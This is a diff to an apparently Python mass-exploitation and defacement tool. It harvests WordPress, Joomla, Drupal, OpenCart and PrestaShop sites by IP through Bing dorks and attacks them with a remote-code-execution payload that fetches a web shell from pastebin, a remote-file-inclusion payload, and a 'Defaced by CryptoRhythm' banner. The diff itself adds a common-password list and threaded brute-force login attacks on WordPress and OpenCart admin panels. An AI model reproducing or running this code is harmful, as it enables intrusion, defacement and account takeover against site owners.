@@ -7,6 +7,8 @@ import string
 import random
 import cookielib
 import os
+from time import sleep
+from threading import Thread
 import multipart
 
 # Data Section #
@@ -24,6 +26,7 @@ defaceText = "Defaced by CryptoRhythm"
 user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
 rce_payload = "fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/crypto.php','w+'),file_get_contents('http://pastebin.com/raw/f2zuvr5f'));"
 rfi_payload = "http://pastebin.com/raw/f2zuvr5f"
+password_list = ["admin", '123123', 'admin123', 'admin456', '123', '123456', '1234567', '123456789', 'azerty', 'qwerty', 'azerty123', 'qwerty123', 'pass123', 'welcome123', 'welcome', 'pass@123', 'password@123']
 # Bringers #
 class Bringers:
     def __init__(self, ip):
@@ -33,7 +36,7 @@ class Bringers:
             ip = self.ip
             wp_list = []
             i = 0
-            while(i <= 61):
+            while(i <= 41):
                 opener = urllib2.urlopen("http://www.bing.com/search?q=ip%3a"+str(ip)+"+%3fpage_id%3d&go=Submit&first="+str(i)).read()
                 bringSites = re.findall('<a href="(.*?)" h="(.*?)">', opener)
                 for site in bringSites:
@@ -52,7 +55,7 @@ class Bringers:
             ip = self.ip
             jo_list = []
             i = 0
-            while(i <= 61):
+            while(i <= 41):
                 opener = urllib2.urlopen("http://www.bing.com/search?q=ip%3a"+str(ip)+"+%3findex.php%3Foption%3Dcom_&go=Submit&first="+str(i)).read()
                 bringSites = re.findall('<a href="(.*?)" h="(.*?)">', opener)
                 for site in bringSites:
@@ -71,7 +74,7 @@ class Bringers:
             ip = self.ip
             dr_list = []
             i = 0
-            while(i <= 61):
+            while(i <= 41):
                 opener = urllib2.urlopen("http://www.bing.com/search?q=ip%3a"+str(ip)+"+%2F%3Fq%3Dnode%2F&go=Submit&first="+str(i)).read()
                 bringSites = re.findall('<a href="(.*?)" h="(.*?)">', opener)
                 for site in bringSites:
@@ -90,7 +93,7 @@ class Bringers:
             ip = self.ip
             oc_list = []
             i = 0
-            while(i <= 61):
+            while(i <= 41):
                 opener = urllib2.urlopen("http://www.bing.com/search?q=ip%3a"+str(ip)+"+%2Findex.php%3Froute%3Dcommon&go=Submit&first="+str(i)).read()
                 bringSites = re.findall('<a href="(.*?)" h="(.*?)">', opener)
                 for site in bringSites:
@@ -109,7 +112,7 @@ class Bringers:
             ip = self.ip
             pr_list = []
             i = 0
-            while(i <= 61):
+            while(i <= 41):
                 opener = urllib2.urlopen("http://www.bing.com/search?q=ip%3a"+str(ip)+"+%2Findex.php%3Fcontroller%3D&go=Submit&first="+str(i)).read()
                 bringSites = re.findall('<a href="(.*?)" h="(.*?)">', opener)
                 for site in bringSites:
@@ -1019,26 +1022,37 @@ class PRExploiter:
             return page
         except:
             pass
-class Bruters:
-    def __init__(self, url):
-        try:
-            self.url = url
-        except:
-            pass
-    def WPBrute(self, username, password):
-        try:
-            brute_url = str(self.url)+"/wp-login.php"
-            cj = cookielib.CookieJar()
-            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
-            login_data = urllib.urlencode({'log' : username, 'pwd' : password, 'wp-submit' : 'Log+In'})
-            opener.open(brute_url, login_data)
-            response = opener.open(str(self.url)+'/wp-admin')
-            final = response.read()
-            if '<li id="wp-admin-bar-logout">' in final:
-                print "Attacked ! wordpress : "+str(brute_url)+" : "+str(username)+" : "+str(password)
-        except Exception as ex:
-            print ex
-            pass
+# Brute forcers #
+def WPBrute(url, username, password):
+    try:
+        cj = cookielib.CookieJar()
+        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+        login_post = {
+            'log' : username,
+            'pwd' : password
+        }
+        login_post = urllib.urlencode(login_post)
+        opener.open(url+"/wp-login.php", login_post)
+        resp = opener.open(url+"/wp-admin").read()
+        if('<li id="wp-admin-bar-logout' in resp):
+            print "Wordpress : "+str(url)+" : "+str(username)+" : "+str(password)
+    except:
+        pass
+def OCBrute(url, username, password):
+    try:
+        cookie_jar = cookielib.CookieJar()
+        login_form_seq = [
+         ('username', 'admin'),
+         ('password', password)]
+        login_form_data = urllib.urlencode(login_form_seq)
+        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
+        site = opener.open(url + "/admin/", login_form_data).read()
+        if re.search('type="password"',site):
+            logged = False
+        else :
+            print "Opencart : "+str(url)+" : "+str(username)+" : "+str(password)
+    except :
+        pass
 # Main #
 def setup(array):
     try:
@@ -1052,11 +1066,17 @@ def start(method):
         def_method = method
         for ip in list_ips:
             bringer = Bringers(ip)
+            reprint("Grabbing : 0% FROM : "+str(ip))
             wp_list.extend(bringer.bringWP())
+            reprint("Grabbing : 20% FROM : "+str(ip))
             jo_list.extend(bringer.bringJO())
+            reprint("Grabbing : 40% FROM : "+str(ip))
             dr_list.extend(bringer.bringDR())
+            reprint("Grabbing : 60% FROM : "+str(ip))
             oc_list.extend(bringer.bringOC())
+            reprint("Grabbing : 80% FROM : "+str(ip))
             pr_list.extend(bringer.bringPR())
+            reprint("Grabbing : 100% FROM : "+str(ip))
         print "Grabbing completed successfully."
         print "Wordpress : "+str(len(wp_list))
         print "Joomla : "+str(len(jo_list))
@@ -1065,6 +1085,8 @@ def start(method):
         print "Prestashop : "+str(len(wp_list))
         print "Running the exploiter."
         exploit()
+        print "Exploiting completed, starting the brute forcer"
+        brute()
     except:
         pass
 def exploit():
@@ -1094,4 +1116,25 @@ def exploit():
     for pr in pr_list:
         reprint("Exploiting Prestashop : "+str(pr_index)+" / "+str(len(pr_list)))
         prxp = PRExploiter(pr)
+        print pr
         pr_index += 1
+def brute():
+    global wp_list, oc_list, password_list
+    wp_thrdlst = []
+    oc_thrdlst = []
+    for wp in wp_list:
+        for ps in password_list:
+            t = Thread(target=WPBrute, args=(wp,'admin',ps))
+            t.start()
+            wp_thrdlst.append(t)
+            sleep(0.009)
+    for oc in oc_list:
+        for ps in password_list:
+            t = Thread(target=OCBrute, args=(oc,'admin',ps))
+            t.start()
+            oc_thrdlst.append(t)
+            sleep(0.009)
+    for w in wp_thrdlst:
+        w.join()
+    for c in oc_thrdlst:
+        c.join()
